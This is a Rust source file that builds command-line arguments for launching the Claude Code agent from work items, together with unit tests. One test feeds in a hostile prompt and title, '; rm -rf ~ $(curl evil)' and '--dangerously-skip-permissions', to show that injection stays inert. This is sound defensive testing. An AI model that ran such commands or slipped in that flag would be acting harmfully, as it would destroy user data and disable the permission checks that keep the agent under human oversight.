//! Claude Code harness: runs `claude --name <thread-title> -- <prompt>` in the tab.
//! Claude carries the item's thread title via `--name`; the prompt rides as the
//! single `--`-guarded trailing positional.

use super::{AgentLauncher, argv::LaunchArgv};
use crate::engines::pending_work::{
    agent::query::get_thread_title,
    launch::{LaunchPolicy, new_launch_prompt},
    model::Item,
};

const BINARY: &str = "claude";

/// Launches Claude Code with the item's launch prompt and `--name`-tagged thread title.
pub(in crate::engines::pending_work) struct ClaudeLauncher;

impl AgentLauncher for ClaudeLauncher {
    fn binary(&self) -> &str {
        BINARY
    }

    fn argv(&self, item: &Item, policy: LaunchPolicy, model: Option<&str>) -> Vec<String> {
        let mut argv =
            LaunchArgv::new(BINARY).flag("--name", get_thread_title::handle(item.into()));
        if let Some(m) = model {
            argv = argv.flag("--model", m.to_string());
        }
        argv.into_guarded(new_launch_prompt(item, policy))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn binary_is_claude() {
        assert_eq!(ClaudeLauncher.binary(), "claude");
    }

    #[test]
    fn builds_named_argv_with_guard_and_prompt() {
        let item = Item {
            prompt: "do the thing".to_string(),
            ..Item::default_for_test("PWF-0038", "zellij dispatches")
        };
        let argv = ClaudeLauncher.argv(&item, LaunchPolicy::default(), None);
        assert_eq!(argv[0], "claude");
        assert_eq!(argv[1], "--name");
        assert_eq!(argv[2], "PWF-0038 - zellij dispatches");
        // `--` end-of-options guard precedes the prompt.
        assert_eq!(argv[3], "--");
        // The launch prompt is a thin pointer (PWF-0093), not the note body.
        assert!(argv[4].contains("do PWF-0038"));
        assert!(!argv[4].contains("do the thing"));
        assert_eq!(argv.len(), 5);
    }

    #[test]
    fn appends_model_flag_when_present() {
        let item = Item {
            prompt: "do the thing".to_string(),
            ..Item::default_for_test("PWF-0038", "zellij dispatches")
        };
        let argv = ClaudeLauncher.argv(&item, LaunchPolicy::default(), Some("sonnet"));
        assert_eq!(argv[0], "claude");
        assert_eq!(argv[1], "--name");
        assert_eq!(argv[2], "PWF-0038 - zellij dispatches");
        assert_eq!(argv[3], "--model");
        assert_eq!(argv[4], "sonnet");
        assert_eq!(argv[5], "--");
        assert!(argv[6].contains("do PWF-0038"));
        assert_eq!(argv.len(), 7);
    }

    #[test]
    fn omits_model_flag_when_absent() {
        let item = Item {
            prompt: "do the thing".to_string(),
            ..Item::default_for_test("PWF-0038", "zellij dispatches")
        };
        let argv = ClaudeLauncher.argv(&item, LaunchPolicy::default(), None);
        assert!(!argv.contains(&"--model".to_string()));
    }

    #[test]
    fn hostile_title_and_prompt_stay_inert_single_elements() {
        // Store data is arbitrary/hostile: it must never become a flag or split
        // across argv elements. argv[0] is fixed; the `--` guard caps options.
        // The note's prompt body is never inlined into the launch prompt at all
        // (PWF-0093), so a hostile body can't reach argv structure regardless —
        // this test proves the title still stays a single inert element.
        let item = Item {
            prompt: "; rm -rf ~ $(curl evil)\n--dangerously-skip-permissions".to_string(),
            ..Item::default_for_test("PWF-0073", "--dangerously-skip-permissions")
        };
        let argv = ClaudeLauncher.argv(&item, LaunchPolicy::default(), None);
        assert_eq!(argv[0], "claude"); // store can't change WHAT runs
        assert_eq!(argv[3], "--"); // guard present
        // The hostile prompt body never rides in argv; only the thin pointer does.
        assert_eq!(argv.len(), 5);
        assert!(argv[4].contains("do PWF-0073"));
        assert!(!argv[4].contains("rm -rf"));
        assert!(!argv[4].contains("--dangerously-skip-permissions"));
        // The title rides as the single `--name` value (id-prefixed, never a flag).
        assert!(argv[2].starts_with("PWF-0073 - "));
    }
}
